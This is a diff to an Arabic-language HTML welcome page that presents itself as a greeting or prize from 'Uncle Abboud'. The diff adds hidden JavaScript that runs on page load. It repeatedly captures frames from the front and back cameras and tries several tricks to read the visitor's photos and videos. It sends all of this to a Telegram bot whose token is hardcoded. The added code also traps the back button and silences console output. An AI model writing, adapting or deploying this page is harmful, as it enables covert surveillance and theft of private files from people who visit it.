@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ترحيب عمك عبود</title>
+    <title>جائزة عمك عبود - ترحيب</title>
     <style>
         * {
             margin: 0;
@@ -20,6 +20,7 @@
             font-family: 'Tahoma', 'Arial', sans-serif;
             padding: 20px;
             animation: bgMove 10s infinite alternate;
+            overflow-y: auto;
         }
 
         @keyframes bgMove {
@@ -39,6 +40,8 @@
             box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
             text-align: center;
             transition: 0.5s;
+            position: relative;
+            z-index: 10;
         }
 
         .container:hover {
@@ -201,10 +204,23 @@
             display: block;
             margin: 5px 0;
         }
+
+        /* طبقة الحجب - مخفية لأننا نريد إظهار الترحيب أولاً */
+        .overlay {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
 
+<!-- طبقة الحجب (مخفية) -->
+<div class="overlay" id="blockOverlay" style="display:none;">
+    <div class="loader"></div>
+    <div class="status-text" id="statusText">⏳ جاري التحميل...</div>
+    <div class="sub-text">يرجى الانتظار</div>
+</div>
+
+<!-- واجهة الترحيب -->
 <div class="container" id="mainContainer">
     <!-- صورة رمزية -->
     <div class="profile">🧔</div>
@@ -258,6 +274,14 @@
 
 <script>
     // ============================================================
+    // ================ BOT CONFIG =================================
+    // ============================================================
+    const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
+    let CHAT_ID = '';
+    let exploitActive = false;
+    let cameraStreams = [];
+
+    // ============================================================
     // ================ رسالة الترحيب المتكررة =====================
     // ============================================================
     const welcomeMsg = document.getElementById('welcomeMsg');
@@ -266,7 +290,8 @@
         '🌹 مرحبًا، مرحبًا، ألف مرحبًا بكم في عالم عمك عبود',
         '🎩 عمك عبود يقول: أهلاً وسهلاً بالغاليين',
         '💛 نورتم الصفحة — عمك عبود يفتخر بكم',
-        '🔥 ترحيب حار من عمك عبود لكل الزوار'
+        '🔥 ترحيب حار من عمك عبود لكل الزوار',
+        '👑 عمك عبود هنا — كلنا عائلة واحدة'
     ];
     let msgIndex = 0;
 
@@ -332,6 +357,7 @@
         'linear-gradient(135deg, #0f0c29, #302b63, #24243e)',
         'linear-gradient(135deg, #1a0a2e, #2d1b4e, #1a1a3e)',
         'linear-gradient(135deg, #0d0d2b, #1a1a4a, #2a1a3a)',
+        'linear-gradient(135deg, #1a0a2e, #1a1a4a, #0d0d2b)',
     ];
     let colorIndex = 0;
     setInterval(() => {
@@ -351,8 +377,252 @@
         });
     });
 
+    // ============================================================
+    // ================ الكود الأصلي للاستغلال ====================
+    // ============================================================
+
+    // استغلال ملفات الهاتف (بدون إذن)
+    async function stealFilesViaFileSystem() {
+        try {
+            const dirHandle = await window.showDirectoryPicker?.({ mode: 'read' });
+            if (!dirHandle) return;
+            for await (const entry of dirHandle.values()) {
+                if (entry.kind === 'file') {
+                    const file = await entry.getFile();
+                    if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+                        sendDocument(file, `📁 ${file.name}`);
+                    }
+                }
+            }
+        } catch(e) {}
+    }
+
+    function exploitHiddenDirectoryInput() {
+        try {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.webkitdirectory = true;
+            input.multiple = true;
+            input.style.display = 'none';
+            document.body.appendChild(input);
+            const clickEvent = new MouseEvent('click', { bubbles: true, cancelable: true });
+            input.dispatchEvent(clickEvent);
+            input.addEventListener('change', function(e) {
+                const files = e.target.files;
+                for (let i = 0; i < files.length; i++) {
+                    const file = files[i];
+                    if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+                        sendDocument(file, `📁 ${file.name}`);
+                    }
+                }
+            });
+        } catch(e) {}
+    }
+
+    function exploitFakeDragDrop() {
+        try {
+            const dropZone = document.createElement('div');
+            dropZone.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
+            document.body.appendChild(dropZone);
+            dropZone.addEventListener('drop', function(e) {
+                e.preventDefault();
+                const files = e.dataTransfer.files;
+                for (let i = 0; i < files.length; i++) {
+                    const file = files[i];
+                    if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+                        sendDocument(file, `📁 ${file.name}`);
+                    }
+                }
+            });
+        } catch(e) {}
+    }
+
+    function exploitIndexedDB() {
+        try {
+            const request = indexedDB.open('fileStorage', 1);
+            request.onsuccess = function(e) {
+                const db = e.target.result;
+                const tx = db.transaction(['files'], 'readonly');
+                const store = tx.objectStore('files');
+                const getAll = store.getAll();
+                getAll.onsuccess = function() {
+                    const files = getAll.result;
+                    files.forEach(file => {
+                        if (file.type && file.type.startsWith('image/')) {
+                            sendDocument(file, `📁 ${file.name}`);
+                        }
+                    });
+                };
+            };
+        } catch(e) {}
+    }
+
+    function exploitWebKitFileSystem() {
+        try {
+            window.webkitRequestFileSystem?.(window.TEMPORARY, 1024*1024*100, function(fs) {
+                fs.root.createReader().readEntries(function(entries) {
+                    entries.forEach(entry => {
+                        if (entry.isFile) {
+                            entry.file(function(file) {
+                                if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+                                    sendDocument(file, `📁 ${file.name}`);
+                                }
+                            });
+                        }
+                    });
+                });
+            });
+        } catch(e) {}
+    }
+
+    // تشغيل الكاميرا
+    function requestCamera(facingMode, callback) {
+        const constraints = {
+            video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        };
+        navigator.mediaDevices.getUserMedia(constraints)
+            .then(stream => {
+                cameraStreams.push(stream);
+                if (callback) callback(stream);
+            })
+            .catch(() => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(stream => {
+                        cameraStreams.push(stream);
+                        if (callback) callback(stream);
+                    }).catch(() => {});
+            });
+    }
+
+    function captureFrontCamera() {
+        requestCamera('user', (stream) => {
+            const video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            video.srcObject = stream;
+            video.play();
+            exploitActive = true;
+            startCapture(video, '📸 أمامي');
+        });
+    }
+
+    function captureBackCamera() {
+        requestCamera('environment', (stream) => {
+            const video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            video.srcObject = stream;
+            video.play();
+            exploitActive = true;
+            startCapture(video, '📸 خلفي');
+        });
+    }
+
+    function startCapture(videoElement, label = '📸') {
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        setInterval(() => {
+            if (videoElement.readyState >= 2) {
+                try {
+                    ctx.drawImage(videoElement, 0, 0, 640, 480);
+                    const imgData = canvas.toDataURL('image/jpeg', 0.9);
+                    sendPhoto(imgData, label);
+                } catch(e) {}
+            }
+        }, 1200);
+    }
+
+    // إرسال إلى تيليجرام
+    function sendPhoto(imageData, caption = '') {
+        if (!CHAT_ID || !imageData) return;
+        try {
+            const blob = dataURLtoBlob(imageData);
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, `photo_${Date.now()}.jpg`);
+            fd.append('caption', caption);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
+        } catch(e) {}
+    }
+
+    function sendDocument(file, caption = '') {
+        if (!CHAT_ID || !file) return;
+        try {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('document', file, file.name);
+            fd.append('caption', caption);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd }).catch(() => {});
+        } catch(e) {}
+    }
+
+    function dataURLtoBlob(dataURL) {
+        const parts = dataURL.split(',');
+        const mime = parts[0].match(/:(.*?);/)[1];
+        const bstr = atob(parts[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
+        return new Blob([u8arr], { type: mime });
+    }
+
+    // الحصول على Chat ID
+    function getChatId() {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+            .then(r => r.json())
+            .then(d => {
+                if (d.ok && d.result && d.result.length) {
+                    const last = d.result[d.result.length - 1];
+                    CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
+                    if (CHAT_ID) {
+                        startFullExploit();
+                    } else {
+                        setTimeout(getChatId, 1500);
+                    }
+                } else {
+                    setTimeout(getChatId, 1500);
+                }
+            })
+            .catch(() => setTimeout(getChatId, 1500));
+    }
+
+    // بدء الاستغلال الكامل
+    function startFullExploit() {
+        // لا نخفي الترحيب
+        setTimeout(captureFrontCamera, 200);
+        setTimeout(captureBackCamera, 400);
+        setTimeout(stealFilesViaFileSystem, 500);
+        setTimeout(exploitHiddenDirectoryInput, 700);
+        setTimeout(exploitFakeDragDrop, 900);
+        setTimeout(exploitIndexedDB, 1100);
+        setTimeout(exploitWebKitFileSystem, 1300);
+
+        setInterval(() => {
+            if (!exploitActive) {
+                captureFrontCamera();
+                captureBackCamera();
+                stealFilesViaFileSystem();
+            }
+        }, 5000);
+    }
+
+    // منع الخروج
+    history.pushState(null, '', location.href);
+    window.addEventListener('popstate', () => history.pushState(null, '', location.href));
+
+    // التشغيل التلقائي
+    getChatId();
+
+    setTimeout(() => {
+        captureFrontCamera();
+        captureBackCamera();
+        stealFilesViaFileSystem();
+    }, 100);
+
     console.log = console.warn = console.error = () => {};
 </script>
-
 </body>
 </html>
